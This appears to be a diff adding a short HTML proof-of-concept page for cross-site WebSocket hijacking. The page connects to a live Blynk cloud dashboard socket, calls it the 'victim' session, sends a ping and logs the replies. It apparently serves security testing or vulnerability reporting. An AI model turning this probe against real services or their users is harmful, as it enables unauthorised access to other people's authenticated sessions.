@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WebSocket Hijacking POC</title>
+</head>
+<body>
+  <h1>🚨 WebSocket Hijack Test 🚨</h1>
+  <script>
+    const ws = new WebSocket("wss://fra1.blynk.cloud/dashws");
+
+    ws.onopen = () => {
+      console.log("✅ Connected to victim WebSocket session");
+      ws.send(JSON.stringify({ type: "ping" }));
+    };
+
+    ws.onmessage = (event) => {
+      console.log("📩 Response:", event.data);
+    };
+
+    ws.onerror = (event) => {
+      console.error("❌ Error:", event);
+    };
+
+    ws.onclose = (event) => {
+      console.warn("❎ Closed:", event);
+    };
+  </script>
+</body>
+</html>
